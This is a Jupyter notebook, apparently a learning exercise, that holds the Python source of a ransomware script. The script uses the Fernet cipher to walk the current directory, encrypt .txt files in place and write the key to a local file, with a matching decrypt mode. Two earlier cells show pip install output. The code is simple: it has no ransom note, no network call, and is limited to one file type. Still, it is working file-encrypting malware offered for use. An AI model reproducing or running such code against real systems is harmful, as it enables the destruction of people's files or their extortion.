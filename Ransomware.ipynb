{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR: Could not find a version that satisfies the requirement cryptography.fernet (from versions: none)\n",
      "ERROR: No matching distribution found for cryptography.fernet\n"
     ]
    }
   ],
   "source": [
    "!pip install cryptography.fernet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: cryptography in c:\\users\\charl\\anaconda3\\lib\\site-packages (3.1.1)\n",
      "Requirement already satisfied: cffi!=1.11.3,>=1.8 in c:\\users\\charl\\anaconda3\\lib\\site-packages (from cryptography) (1.14.3)\n",
      "Requirement already satisfied: six>=1.4.1 in c:\\users\\charl\\anaconda3\\lib\\site-packages (from cryptography) (1.15.0)\n",
      "Requirement already satisfied: pycparser in c:\\users\\charl\\anaconda3\\lib\\site-packages (from cffi!=1.11.3,>=1.8->cryptography) (2.20)\n"
     ]
    }
   ],
   "source": [
    "!pip install cryptography"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#This is the implementation of a ransomware script\n",
    "\n",
    "import os\n",
    "from os.path import expanduser\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "class Ransomware(object):\n",
    "    \n",
    "    def __init__(self):\n",
    "        self.key = None\n",
    "        self.cryptor = None\n",
    "        self.file_ext_target = ['txt']\n",
    "        \n",
    "        \n",
    "    def generate_key(self):\n",
    "        self.key = Fernet.generate_key()\n",
    "        self.cryptor = Fernet(self.key)\n",
    "        \n",
    "        \n",
    "    def read_key(self, keyfile_name):\n",
    "        with open(keyfile_name, \"rb\") as f:\n",
    "            self.key = f.read()\n",
    "            self.cryptor = Fernet(self.key)\n",
    "        \n",
    "        \n",
    "    def write_key(self, keyfile_name):\n",
    "        print(self.key)\n",
    "        with open(keyfile_name, \"wb\") as f:\n",
    "            f.write(self.key)\n",
    "            \n",
    "            \n",
    "    def crypt_root(self, root_dir, encrypted=False):\n",
    "        for root, _, files in os.walk(root_dir):\n",
    "            for f in files:\n",
    "                abs_file_path = os.path.join(root, f)\n",
    "                if not abs_file_path.split(\".\")[-1] in self.file_ext_target:\n",
    "                    continue\n",
    "                self.crypt_file(abs_file_path, encrypted= encrypted)\n",
    "                \n",
    "                \n",
    "    def crypt_file(self, file_path, encrypted=False):\n",
    "        with open(file_path, \"rb+\") as f:\n",
    "            _data = f.read()\n",
    "            if not encrypted:\n",
    "                print()\n",
    "                print(f\"files contained before encryption :{_data}\")\n",
    "                data = self.cryptor.encrypt(_data)\n",
    "                print(f\"files contained after encryption :{data}\")\n",
    "            else:\n",
    "                data = self.cryptor.decrypt(_data)\n",
    "                print(f\"files contained before encryption :{data}\")\n",
    "            f.seek(0)\n",
    "            f.write(data)\n",
    "            \n",
    "if __name__ == \"__main__\":\n",
    "    local_root = \".\"\n",
    "    \n",
    "    import argparse\n",
    "    parser = argparse.ArgumentParser()\n",
    "    parser.add_argument(\"--action\", required=True)\n",
    "    parser.add_argument(\"--keyfile\")\n",
    "    \n",
    "    args = parser.parse_args()\n",
    "    action = args.action.lower()\n",
    "    keyfile = args.keyfile\n",
    "    \n",
    "    ransom = Ransomware()\n",
    "    \n",
    "    if action == \"decrypt\":\n",
    "        if keyfile is None:\n",
    "            print(\"Path to keyfile must be included for encryption\")\n",
    "        else:\n",
    "            ransom.read_key(keyfile)\n",
    "            ransom.crypt_root(local_root, encrypted=True)\n",
    "    elif action == \"encrypted\":\n",
    "        ransom.generate_key()\n",
    "        ransom.write_key(\"keyfile\")\n",
    "        ransom.crypt_root(local_root)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
